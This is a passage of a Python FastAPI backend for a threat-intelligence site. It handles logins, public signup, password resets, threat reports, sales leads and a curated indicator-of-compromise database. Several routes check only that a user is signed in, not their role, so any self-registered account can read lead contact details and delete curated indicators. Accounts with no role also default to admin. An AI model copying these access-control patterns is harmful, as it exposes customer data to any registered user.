from dotenv import load_dotenv
from pathlib import Path
import os

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

from fastapi import FastAPI, APIRouter, HTTPException, Request, Depends, UploadFile, File
from starlette.middleware.cors import CORSMiddleware
from starlette.middleware.gzip import GZipMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import logging
from pydantic import BaseModel, Field, ConfigDict, BeforeValidator, EmailStr
from typing import List, Optional, Annotated, Any
import uuid
import asyncio
import re
import csv
import io
import json
from datetime import datetime, timezone, timedelta
import bcrypt
import jwt
import httpx
from bson import ObjectId
from openpyxl import load_workbook

# Performance instrumentation + intelligent cache for OSINT lookups
from ioc_perf import (
    instrument, get_cached, set_cached, ensure_indexes as _ensure_perf_indexes,
    metrics as _perf_metrics, gate as _gate,
    BATCH_CONCURRENCY as _BATCH_CONCURRENCY, BatchTimer as _BatchTimer,
)

# ---------------------------------------------------------------------------
# Setup
# ---------------------------------------------------------------------------
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_ALGORITHM = "HS256"
CISA_FEED_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI(title="NivX Machines API")
api_router = APIRouter(prefix="/api")

# ---------------------------------------------------------------------------
# Model helpers
# ---------------------------------------------------------------------------
PyObjectId = Annotated[str, BeforeValidator(str)]


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Auth utils
# ---------------------------------------------------------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))


def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]


def create_access_token(user_id: str, email: str) -> str:
    payload = {
        "sub": user_id,
        "email": email,
        "exp": datetime.now(timezone.utc) + timedelta(days=7),
        "type": "access",
    }
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)


async def get_current_user(request: Request) -> dict:
    token = request.cookies.get("access_token")
    if not token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "access":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        user["_id"] = str(user["_id"])
        user.pop("password_hash", None)
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")


# ---------------------------------------------------------------------------
# Pydantic Models
# ---------------------------------------------------------------------------
class LoginInput(BaseModel):
    email: str
    password: str


class SignupInput(BaseModel):
    email: EmailStr
    password: str = Field(..., min_length=8, max_length=128)
    name: Optional[str] = Field(None, max_length=80)


def require_role(*allowed_roles: str):
    """Dependency factory — enforce that the authenticated user has one of the
    given roles. Falls back to admin for missing role (backwards-compat with
    pre-refactor accounts)."""
    allowed = set(r.lower() for r in allowed_roles)
    async def _dep(user: dict = Depends(get_current_user)) -> dict:
        role = (user.get("role") or "admin").lower()
        if role not in allowed:
            raise HTTPException(status_code=403, detail=f"Access denied — requires role: {', '.join(sorted(allowed))}")
        return user
    return _dep


class ProcessNode(BaseModel):
    name: str
    pid: Optional[str] = None
    cmd: Optional[str] = None
    malicious: bool = False
    children: List["ProcessNode"] = []


class ThreatReportBase(BaseModel):
    title: str
    summary: str
    severity: str = "high"  # critical | high | medium | low
    category: str = "Malware"
    threat_actor: Optional[str] = None
    actor_slug: Optional[str] = None  # FK to ThreatBox (`threat_actors.slug`) — single source of truth
    image_url: Optional[str] = None
    attack_chain: List[str] = []  # MITRE ATT&CK ordered tactics
    iocs: List[str] = []
    process_tree: Optional[ProcessNode] = None
    source: str = "NivX Intel"


class ThreatReportCreate(ThreatReportBase):
    pass


class ThreatReport(ThreatReportBase):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    created_at: str = Field(default_factory=now_iso)
    updated_at: str = Field(default_factory=now_iso)


ProcessNode.model_rebuild()


class LeadCreate(BaseModel):
    name: str
    email: EmailStr
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    website: Optional[str] = None  # honeypot — real users leave blank


class Lead(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    name: str
    email: str
    company: Optional[str] = None
    phone: Optional[str] = None
    company_size: Optional[str] = None
    interest: Optional[str] = None
    message: Optional[str] = None
    status: str = "new"
    notes: Optional[str] = None
    assignee: Optional[str] = None
    created_at: str = Field(default_factory=now_iso)


LEAD_STATUSES = ["new", "contacted", "qualified", "archived"]


class LeadUpdate(BaseModel):
    status: Optional[str] = None
    notes: Optional[str] = None
    assignee: Optional[str] = None


# ---------------------------------------------------------------------------
# Custom IOC database (curated indicators)
# ---------------------------------------------------------------------------
IOC_SEVERITIES = ["low", "medium", "high", "critical"]


def _ioc_key(value: str) -> str:
    """Canonical match key: defanged + lowercased."""
    v = (value or "").strip()
    v = v.replace("[.]", ".").replace("(.)", ".").replace("[dot]", ".").replace("{.}", ".")
    v = v.replace("hxxps", "https").replace("hxxp", "http")
    v = v.replace("[:]", ":")
    return v.lower()


class IocRecordCreate(BaseModel):
    value: str
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"
    notes: Optional[str] = None


class IocRecord(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    value: str
    key: str
    type: str
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"
    notes: Optional[str] = None
    created_at: str = Field(default_factory=now_iso)
    # OSINT auto-ingest fields (populated when this IOC is added/updated from
    # a live OSINT investigation via _auto_ingest_from_osint).
    risk_score: Optional[int] = None                # 0-100 deterministic score
    auto_added: bool = False                        # True when originally added by auto-ingest
    osint_summary: Optional[dict] = None            # structured verdict snapshot
    last_reputation_at: Optional[str] = None


class IocBulkCreate(BaseModel):
    values: List[str] = []
    threat_name: Optional[str] = None
    tags: List[str] = []
    source: Optional[str] = None
    severity: str = "medium"


class IocBulkDelete(BaseModel):
    ids: List[str] = []


# ---------------------------------------------------------------------------
# Auth routes
# ---------------------------------------------------------------------------
@api_router.post("/auth/login")
async def login(payload: LoginInput):
    email = payload.email.lower().strip()
    user = await db.users.find_one({"email": email})
    if not user or not verify_password(payload.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    token = create_access_token(str(user["_id"]), email)
    return {
        "access_token": token,
        "user": {"id": str(user["_id"]), "email": email, "name": user.get("name", "Admin"), "role": user.get("role", "admin")},
    }


SIGNUP_RATE_MAX = 5       # max signups per IP per hour
SIGNUP_RATE_WINDOW = 3600 # seconds


@api_router.post("/auth/signup")
async def signup(payload: SignupInput, request: Request):
    """Public sign-up — creates a `role: "user"` account. Rate-limited to
    5 signups per IP per hour to deter abuse. Employees/admins are created
    only via the admin panel — this endpoint always assigns role='user'."""
    email = payload.email.lower().strip()
    ip = (request.headers.get("x-forwarded-for") or request.client.host or "unknown").split(",")[0].strip()

    # IP rate limit — Mongo counter with sliding-window using TTL.
    since = datetime.now(timezone.utc) - timedelta(seconds=SIGNUP_RATE_WINDOW)
    recent_count = await db.signup_attempts.count_documents({"ip": ip, "created_at": {"$gte": since.isoformat()}})
    if recent_count >= SIGNUP_RATE_MAX:
        raise HTTPException(status_code=429, detail="Too many signups from this IP, please try again later")

    existing = await db.users.find_one({"email": email})
    if existing:
        raise HTTPException(status_code=409, detail="An account with this email already exists")

    # Weak-password guard beyond min_length: at least 1 letter + 1 digit
    if not (any(c.isalpha() for c in payload.password) and any(c.isdigit() for c in payload.password)):
        raise HTTPException(status_code=422, detail="Password must contain at least one letter and one digit")

    now = datetime.now(timezone.utc).isoformat()
    doc = {
        "email": email,
        "password_hash": hash_password(payload.password),
        "name": (payload.name or email.split("@")[0]).strip()[:80],
        "role": "user",           # always 'user' — no privilege escalation via this endpoint
        "created_at": now,
        "bookmarks": [],          # for future: ThreatBox actor bookmarks
        "watchlist": [],          # for future: IOC watchlist
    }
    res = await db.users.insert_one(doc)
    await db.signup_attempts.insert_one({"ip": ip, "email": email, "created_at": now})

    token = create_access_token(str(res.inserted_id), email)
    return {
        "access_token": token,
        "user": {"id": str(res.inserted_id), "email": email, "name": doc["name"], "role": "user"},
    }


@api_router.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    return {"id": user["_id"], "email": user["email"], "name": user.get("name", "Admin"), "role": user.get("role", "admin")}


# ---------------------------------------------------------------------------
# Personal /me routes — bookmarks + IOC watchlist for any signed-in user
# ---------------------------------------------------------------------------
class WatchlistItem(BaseModel):
    value: str = Field(..., min_length=1, max_length=500)
    note: Optional[str] = Field(None, max_length=280)


class ChangePasswordInput(BaseModel):
    current_password: str = Field(..., min_length=1, max_length=200)
    new_password: str = Field(..., min_length=8, max_length=128)


class AdminResetPasswordInput(BaseModel):
    new_password: Optional[str] = Field(None, min_length=8, max_length=128, description="If omitted, a temp password is generated")
    must_change: bool = True


@api_router.get("/me/bookmarks")
async def me_get_bookmarks(user: dict = Depends(get_current_user)):
    """Returns the user's ThreatBox actor bookmarks, hydrated with the actor
    display name so the client doesn't need N+1 lookups."""
    doc = await db.users.find_one({"_id": ObjectId(user["_id"])}, {"bookmarks": 1})
    slugs = list((doc or {}).get("bookmarks", []))
    if not slugs:
        return {"count": 0, "bookmarks": []}
    cursor = db.threat_actors.find(
        {"slug": {"$in": slugs}},
        {"_id": 0, "slug": 1, "name": 1, "motivation": 1, "origin_country": 1},
    )
    actors = [a async for a in cursor]
    # Preserve user's chronological add order
    order = {s: i for i, s in enumerate(slugs)}
    actors.sort(key=lambda a: order.get(a["slug"], 9999))
    return {"count": len(actors), "bookmarks": actors}


@api_router.post("/me/bookmarks/threatbox/{slug}")
async def me_add_bookmark(slug: str, user: dict = Depends(get_current_user)):
    slug = slug.lower().strip()
    actor = await db.threat_actors.find_one({"slug": slug}, {"_id": 1, "slug": 1, "name": 1})
    if not actor:
        raise HTTPException(status_code=404, detail=f"ThreatBox actor '{slug}' not found")
    await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$addToSet": {"bookmarks": slug}})
    return {"bookmarked": True, "slug": slug, "name": actor.get("name")}


@api_router.delete("/me/bookmarks/threatbox/{slug}")
async def me_remove_bookmark(slug: str, user: dict = Depends(get_current_user)):
    slug = slug.lower().strip()
    r = await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$pull": {"bookmarks": slug}})
    return {"bookmarked": False, "slug": slug, "removed": r.modified_count > 0}


@api_router.get("/me/watchlist")
async def me_get_watchlist(user: dict = Depends(get_current_user)):
    doc = await db.users.find_one({"_id": ObjectId(user["_id"])}, {"watchlist": 1})
    return {"count": len((doc or {}).get("watchlist", []) or []),
            "watchlist": (doc or {}).get("watchlist", []) or []}


@api_router.post("/me/watchlist")
async def me_add_watchlist(item: WatchlistItem, user: dict = Depends(get_current_user)):
    value = item.value.strip()
    if _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Value is not a recognized hash, IP, domain or URL")
    key = _ioc_key(value)
    # Check current watchlist for duplicates
    doc = await db.users.find_one({"_id": ObjectId(user["_id"])}, {"watchlist": 1})
    current = (doc or {}).get("watchlist", []) or []
    if any(w.get("key") == key for w in current):
        raise HTTPException(status_code=409, detail="Already in watchlist")
    if len(current) >= 100:
        raise HTTPException(status_code=422, detail="Watchlist limit reached (100 items)")
    entry = {
        "value": value,
        "key": key,
        "type": _classify_ioc(value),
        "note": (item.note or "").strip()[:280],
        "added_at": now_iso(),
    }
    await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$push": {"watchlist": entry}})
    # Check if this value already exists in the curated IOC DB → indicate hit
    existing_hit = await db.iocs.find_one({"key": key}, {"_id": 0, "severity": 1, "threat_name": 1, "source": 1, "tags": 1})
    entry["curated_match"] = existing_hit
    return entry


@api_router.delete("/me/watchlist/{value}")
async def me_remove_watchlist(value: str, user: dict = Depends(get_current_user)):
    key = _ioc_key(value)
    r = await db.users.update_one(
        {"_id": ObjectId(user["_id"])},
        {"$pull": {"watchlist": {"key": key}}},
    )
    return {"removed": r.modified_count > 0, "key": key}


# ---------------------------------------------------------------------------
# Password management — role-agnostic self-service + admin reset
# ---------------------------------------------------------------------------
@api_router.post("/auth/change-password")
async def change_own_password(payload: ChangePasswordInput, user: dict = Depends(get_current_user)):
    """Any signed-in user (admin, employee, or public user) can change their
    own password. Requires the current password for verification."""
    if not (any(c.isalpha() for c in payload.new_password) and any(c.isdigit() for c in payload.new_password)):
        raise HTTPException(status_code=422, detail="Password must contain at least one letter and one digit")
    doc = await db.users.find_one({"_id": ObjectId(user["_id"])})
    if not doc or not verify_password(payload.current_password, doc["password_hash"]):
        raise HTTPException(status_code=401, detail="Current password is incorrect")
    if verify_password(payload.new_password, doc["password_hash"]):
        raise HTTPException(status_code=422, detail="New password must be different from the current password")
    await db.users.update_one(
        {"_id": doc["_id"]},
        {"$set": {"password_hash": hash_password(payload.new_password),
                  "must_change_password": False,
                  "password_changed_at": now_iso()}},
    )
    return {"changed": True}


@api_router.get("/admin/users")
async def admin_list_users(user: dict = Depends(require_role("admin"))):
    """Admin view of every account with role + password-hygiene metadata (no
    hashes ever leave the server — bcrypt is one-way, unrecoverable)."""
    cursor = db.users.find(
        {},
        {"password_hash": 0},   # NEVER expose hash — security-critical
    ).sort([("role", 1), ("email", 1)])
    users = []
    async for u in cursor:
        users.append({
            "id": str(u["_id"]),
            "email": u.get("email"),
            "name": u.get("name"),
            "role": (u.get("role") or "admin").lower(),
            "must_change_password": bool(u.get("must_change_password")),
            "password_changed_at": u.get("password_changed_at") or u.get("password_reset_at"),
            "last_login_at": u.get("last_login_at"),
            "created_at": u.get("created_at"),
        })
    return {"count": len(users), "users": users}


@api_router.post("/admin/users/{user_id}/reset-password")
async def admin_reset_user_password(user_id: str, payload: AdminResetPasswordInput, admin: dict = Depends(require_role("admin"))):
    """Force-reset any user's password. Returns the new password ONCE — the
    admin must securely deliver it to the user out-of-band (Signal, phone,
    encrypted email, in-person). NivX never stores or displays it again."""
    try:
        oid = ObjectId(user_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid user id") from e
    target = await db.users.find_one({"_id": oid}, {"password_hash": 0})
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    # Self-reset guard: admin should use /auth/change-password for their OWN account
    if str(oid) == str(admin.get("_id")):
        raise HTTPException(status_code=422, detail="Use /auth/change-password to change your own password (requires current password).")
    if payload.new_password:
        if not (any(c.isalpha() for c in payload.new_password) and any(c.isdigit() for c in payload.new_password)):
            raise HTTPException(status_code=422, detail="Password must contain at least one letter and one digit")
        new_pw = payload.new_password
    else:
        # Generate a 16-char temp password with letters + digits + safe punctuation
        import secrets, string
        alphabet = string.ascii_letters + string.digits + "!@#$%"
        new_pw = "".join(secrets.choice(alphabet) for _ in range(16))
    await db.users.update_one(
        {"_id": oid},
        {"$set": {"password_hash": hash_password(new_pw),
                  "must_change_password": bool(payload.must_change),
                  "password_reset_at": now_iso(),
                  "password_reset_by": str(admin.get("_id"))}},
    )
    return {"reset": True, "new_password": new_pw, "must_change_password": bool(payload.must_change),
            "target_email": target.get("email"), "target_role": target.get("role")}


@api_router.post("/admin/users/{user_id}/must-change-password")
async def admin_toggle_must_change(user_id: str, force: bool = True, admin: dict = Depends(require_role("admin"))):
    """Force the target user to change their password on next login without
    changing the current password. Useful when you suspect a password may
    have leaked but haven't confirmed."""
    try:
        oid = ObjectId(user_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail="Invalid user id") from e
    r = await db.users.update_one({"_id": oid}, {"$set": {"must_change_password": bool(force)}})
    if r.matched_count == 0:
        raise HTTPException(status_code=404, detail="User not found")
    return {"user_id": user_id, "must_change_password": bool(force)}


# ---------------------------------------------------------------------------
# Threat report routes
# ---------------------------------------------------------------------------
@api_router.get("/threats", response_model=List[ThreatReport])
async def list_threats():
    docs = await db.threat_reports.find({}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return [ThreatReport(**d) for d in docs]


@api_router.get("/threats/{threat_id}", response_model=ThreatReport)
async def get_threat(threat_id: str):
    doc = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return ThreatReport(**doc)


@api_router.post("/threats", response_model=ThreatReport)
async def create_threat(payload: ThreatReportCreate, user: dict = Depends(require_role("admin", "employee"))):
    report = ThreatReport(**payload.model_dump())
    await db.threat_reports.insert_one(report.model_dump())
    return report


@api_router.put("/threats/{threat_id}", response_model=ThreatReport)
async def update_threat(threat_id: str, payload: ThreatReportCreate, user: dict = Depends(require_role("admin", "employee"))):
    existing = await db.threat_reports.find_one({"id": threat_id}, {"_id": 0})
    if not existing:
        raise HTTPException(status_code=404, detail="Threat report not found")
    data = payload.model_dump()
    data["updated_at"] = now_iso()
    await db.threat_reports.update_one({"id": threat_id}, {"$set": data})
    merged = {**existing, **data}
    return ThreatReport(**merged)


@api_router.delete("/threats/{threat_id}")
async def delete_threat(threat_id: str, user: dict = Depends(require_role("admin", "employee"))):
    res = await db.threat_reports.delete_one({"id": threat_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Threat report not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Leads (Request a Security Assessment)
# ---------------------------------------------------------------------------
_lead_rate: dict[str, list] = {}
LEAD_RATE_LIMIT = 3          # max submissions
LEAD_RATE_WINDOW = 600       # per 10 minutes (seconds)


def _client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


@api_router.post("/leads", response_model=Lead)
async def create_lead(payload: LeadCreate, request: Request):
    # Honeypot: bots fill hidden 'website' field
    if payload.website:
        logger.info("Lead rejected: honeypot triggered")
        return Lead(name=payload.name, email="honeypot@blocked.local")

    # Simple in-memory IP rate limiting
    ip = _client_ip(request)
    now_ts = datetime.now(timezone.utc).timestamp()
    hits = [t for t in _lead_rate.get(ip, []) if now_ts - t < LEAD_RATE_WINDOW]
    if len(hits) >= LEAD_RATE_LIMIT:
        raise HTTPException(status_code=429, detail="Too many requests. Please try again in a few minutes.")
    hits.append(now_ts)
    _lead_rate[ip] = hits

    data = payload.model_dump(exclude={"website"})
    lead = Lead(**data)
    await db.leads.insert_one(lead.model_dump())
    logger.info(f"New security assessment lead: {lead.email} ({lead.company})")
    return lead


@api_router.get("/leads", response_model=List[Lead])
async def list_leads(user: dict = Depends(get_current_user)):
    docs = await db.leads.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return [Lead(**d) for d in docs]


@api_router.patch("/leads/{lead_id}", response_model=Lead)
async def update_lead(lead_id: str, payload: LeadUpdate, user: dict = Depends(get_current_user)):
    doc = await db.leads.find_one({"id": lead_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Lead not found")
    updates: dict = {}
    if payload.status is not None:
        if payload.status not in LEAD_STATUSES:
            raise HTTPException(status_code=400, detail=f"Invalid status. Allowed: {LEAD_STATUSES}")
        updates["status"] = payload.status
    if payload.notes is not None:
        updates["notes"] = payload.notes
    if payload.assignee is not None:
        updates["assignee"] = payload.assignee
    if not updates:
        raise HTTPException(status_code=400, detail="No fields to update")
    await db.leads.update_one({"id": lead_id}, {"$set": updates})
    return Lead(**{**doc, **updates})


# ---------------------------------------------------------------------------
# Custom IOC database routes (admin-managed, public read)
# ---------------------------------------------------------------------------
def _severity_or_default(s: Optional[str]) -> str:
    s = (s or "").strip().lower()
    return s if s in IOC_SEVERITIES else "medium"


def _parse_tags(t) -> List[str]:
    if isinstance(t, list):
        return [str(x).strip() for x in t if str(x).strip()]
    if isinstance(t, str):
        return [x.strip() for x in re.split(r"[,;|]", t) if x.strip()]
    return []


async def _upsert_ioc(value, threat_name=None, tags=None, source=None, severity="medium", notes=None, ttl_days=None):
    """Insert or update an IOC by canonical key. Returns (record_dict, created_bool).

    If `ttl_days` is set, an `expires_at` timestamp is stamped so the Mongo TTL
    index auto-purges stale feed-sourced IOCs.  On each re-sync the TTL is
    refreshed (sliding window), so IOCs stay alive for as long as the feed
    keeps re-publishing them."""
    value = (value or "").strip()
    if not value:
        return None, False
    key = _ioc_key(value)
    ioc_type = _classify_ioc(value)
    existing = await db.iocs.find_one({"key": key}, {"_id": 0})
    now = now_iso()
    expires_at = None
    if ttl_days:
        try:
            expires_at = datetime.now(timezone.utc) + timedelta(days=int(ttl_days))
        except Exception:
            expires_at = None
    if existing:
        updates: dict = {"updated_at": now}
        if threat_name:
            updates["threat_name"] = threat_name
        if tags:
            updates["tags"] = tags
        if source:
            updates["source"] = source
        if severity:
            updates["severity"] = _severity_or_default(severity)
        if notes:
            updates["notes"] = notes
        if expires_at is not None:
            updates["expires_at"] = expires_at
        await db.iocs.update_one({"key": key}, {"$set": updates})
        return {**existing, **updates}, False
    rec = IocRecord(value=value, key=key, type=ioc_type, threat_name=threat_name, tags=tags or [], source=source, severity=_severity_or_default(severity), notes=notes)
    doc = rec.model_dump()
    if expires_at is not None:
        doc["expires_at"] = expires_at
    await db.iocs.insert_one(doc)
    return doc, True


@api_router.post("/iocs", response_model=IocRecord)
async def create_ioc(payload: IocRecordCreate, user: dict = Depends(get_current_user)):
    if not payload.value.strip():
        raise HTTPException(status_code=400, detail="IOC value is required")
    if _classify_ioc(payload.value) == "unknown":
        raise HTTPException(status_code=422, detail="Value is not a recognized hash, IP, domain or URL")
    rec, _ = await _upsert_ioc(payload.value, payload.threat_name, _parse_tags(payload.tags), payload.source, payload.severity, payload.notes)
    return IocRecord(**rec)


@api_router.post("/iocs/bulk")
async def bulk_create_iocs(payload: IocBulkCreate, user: dict = Depends(get_current_user)):
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            if tok.strip():
                tokens.append(tok.strip())
    seen = set()
    items: List[str] = []
    for t in tokens:
        k = t.lower()
        if k not in seen:
            seen.add(k)
            items.append(t)
    added = updated = skipped = 0
    tags = _parse_tags(payload.tags)
    for v in items[:5000]:
        if _classify_ioc(v) == "unknown":
            skipped += 1
            continue
        _, created = await _upsert_ioc(v, payload.threat_name, tags, payload.source, payload.severity)
        added += 1 if created else 0
        updated += 0 if created else 1
    return {"added": added, "updated": updated, "skipped": skipped, "total": len(items)}


@api_router.post("/iocs/upload")
async def upload_iocs(file: UploadFile = File(...), user: dict = Depends(get_current_user)):
    name = (file.filename or "").lower()
    content = await file.read()
    rows: List[dict] = []
    try:
        if name.endswith(".xlsx") or name.endswith(".xlsm"):
            wb = load_workbook(io.BytesIO(content), read_only=True, data_only=True)
            ws = wb.active
            headers = None
            for r in ws.iter_rows(values_only=True):
                if headers is None:
                    headers = [str(c).strip().lower() if c is not None else "" for c in r]
                    continue
                rows.append({headers[i]: (r[i] if i < len(r) else None) for i in range(len(headers))})
        elif name.endswith(".csv") or name.endswith(".txt"):
            text = content.decode("utf-8-sig", errors="replace")
            reader = csv.DictReader(io.StringIO(text))
            if reader.fieldnames and any((h or "").strip().lower() in ("value", "ioc", "indicator") for h in reader.fieldnames):
                for row in reader:
                    rows.append({(k or "").strip().lower(): v for k, v in row.items()})
            else:
                for line in text.splitlines():
                    line = line.strip().strip('",')
                    if line:
                        rows.append({"value": line})
        else:
            raise HTTPException(status_code=400, detail="Unsupported file type. Upload .csv, .txt or .xlsx")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Could not parse file: {e}")

    def _get(row, *keys):
        for k in keys:
            if k in row and row[k] not in (None, ""):
                return str(row[k]).strip()
        return None

    added = updated = skipped = 0
    for row in rows[:10000]:
        value = _get(row, "value", "ioc", "indicator")
        if not value or _classify_ioc(value) == "unknown":
            skipped += 1
            continue
        _, created = await _upsert_ioc(
            value,
            _get(row, "threat_name", "threat", "malware", "label"),
            _parse_tags(_get(row, "tags", "tag")),
            _get(row, "source"),
            _get(row, "severity") or "medium",
            _get(row, "notes", "description", "comment"),
        )
        added += 1 if created else 0
        updated += 0 if created else 1
    return {"added": added, "updated": updated, "skipped": skipped, "total": len(rows)}


@api_router.get("/iocs")
async def list_iocs(q: Optional[str] = None, type: Optional[str] = None, severity: Optional[str] = None, tag: Optional[str] = None, limit: int = 100, skip: int = 0):
    query: dict = {}
    if type and type != "all":
        query["type"] = {"$in": ["md5", "sha1", "sha256"]} if type == "hash" else type
    if severity and severity != "all":
        query["severity"] = severity
    if tag:
        query["tags"] = tag
    if q:
        rx = {"$regex": re.escape(q.strip()), "$options": "i"}
        query["$or"] = [{"value": rx}, {"threat_name": rx}, {"tags": rx}, {"source": rx}, {"notes": rx}]
    total = await db.iocs.count_documents(query)
    limit = max(1, min(limit, 500))
    docs = await db.iocs.find(query, {"_id": 0}).sort("created_at", -1).skip(max(0, skip)).limit(limit).to_list(limit)
    return {"total": total, "items": docs, "limit": limit, "skip": skip}


@api_router.get("/iocs/stats")
async def ioc_stats():
    total = await db.iocs.count_documents({})
    by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    return {"total": total, "by_severity": by_severity}


@api_router.delete("/iocs/bulk")
async def bulk_delete_iocs(payload: IocBulkDelete, user: dict = Depends(get_current_user)):
    if not payload.ids:
        raise HTTPException(status_code=400, detail="No IOC ids provided")
    res = await db.iocs.delete_many({"id": {"$in": payload.ids}})
    return {"deleted": res.deleted_count}


@api_router.delete("/iocs/{ioc_id}")
async def delete_ioc(ioc_id: str, user: dict = Depends(get_current_user)):
    res = await db.iocs.delete_one({"id": ioc_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="IOC not found")
    return {"deleted": True}


# ---------------------------------------------------------------------------
# Admin SOC Overview — aggregated operational dashboard (auth required)
# ---------------------------------------------------------------------------
@api_router.get("/admin/overview")
async def admin_overview(user: dict = Depends(get_current_user)):
    """Consolidated SOC dashboard: IOC stats, lead pipeline, OTX sync,
    recent activity, provider status. Powers the Admin > Overview tab."""
    # IOCs
    ioc_total = await db.iocs.count_documents({})
    ioc_by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    ioc_by_type = {}
    for t in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        ioc_by_type[t] = await db.iocs.count_documents({"type": t})
    ioc_by_type["hash"] = ioc_by_type.pop("md5", 0) + ioc_by_type.pop("sha1", 0) + ioc_by_type.pop("sha256", 0)

    # Leads pipeline
    lead_total = await db.leads.count_documents({})
    lead_by_status = {s: await db.leads.count_documents({"status": s}) for s in LEAD_STATUSES}
    # Leads added in last 7 days (using created_at ISO string comparison since we store ISO)
    seven_days_ago = (datetime.now(timezone.utc) - timedelta(days=7)).isoformat()
    lead_week = await db.leads.count_documents({"created_at": {"$gte": seven_days_ago}})

    # Threat reports
    reports_total = await db.threat_reports.count_documents({})

    # OTX
    otx_meta = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})

    # Recent activity
    recent_leads = await db.leads.find({}, {"_id": 0, "id": 1, "name": 1, "email": 1, "company": 1, "status": 1, "assignee": 1, "created_at": 1}).sort("created_at", -1).limit(6).to_list(6)
    recent_iocs = await db.iocs.find({}, {"_id": 0, "value": 1, "type": 1, "severity": 1, "threat_name": 1, "source": 1, "created_at": 1}).sort("created_at", -1).limit(6).to_list(6)
    recent_reports = await db.threat_reports.find({}, {"_id": 0, "id": 1, "title": 1, "severity": 1, "category": 1, "created_at": 1}).sort("created_at", -1).limit(5).to_list(5)

    # Top malware families (from IOC tags) — reuse aggregation
    fam_pipeline = [
        {"$unwind": "$tags"},
        {"$match": {"tags": {"$regex": "^family:", "$options": "i"}}},
        {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 5},
    ]
    fam_docs = await db.iocs.aggregate(fam_pipeline).to_list(5)
    top_families = [{"name": d["_id"].split(":", 1)[1] if ":" in d["_id"] else d["_id"], "count": d["count"]} for d in fam_docs]

    return {
        "iocs": {"total": ioc_total, "by_severity": ioc_by_severity, "by_type": ioc_by_type},
        "leads": {"total": lead_total, "by_status": lead_by_status, "last_7_days": lead_week},
        "reports": {"total": reports_total},
        "otx": {"configured": bool(OTX_API_KEY), "last_sync": otx_meta},
        "recent": {"leads": recent_leads, "iocs": recent_iocs, "reports": recent_reports},
        "top_families": top_families,
        "providers": {
            "virustotal": bool(VT_API_KEY),
            "abuseipdb": bool(ABUSEIPDB_API_KEY),
            "urlscan": bool(URLSCAN_API_KEY),
            "otx": bool(OTX_API_KEY),
            "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
            "malwarebazaar": bool(MALWAREBAZAAR_API_KEY),
            "ai_summary": bool(EMERGENT_LLM_KEY),
        },
        "generated_at": now_iso(),
    }


# ---------------------------------------------------------------------------
# Threat Intelligence overview (aggregated stats for the /threat-intelligence hub)
# ---------------------------------------------------------------------------
@api_router.get("/threat-intel/overview")
async def threat_intel_overview():
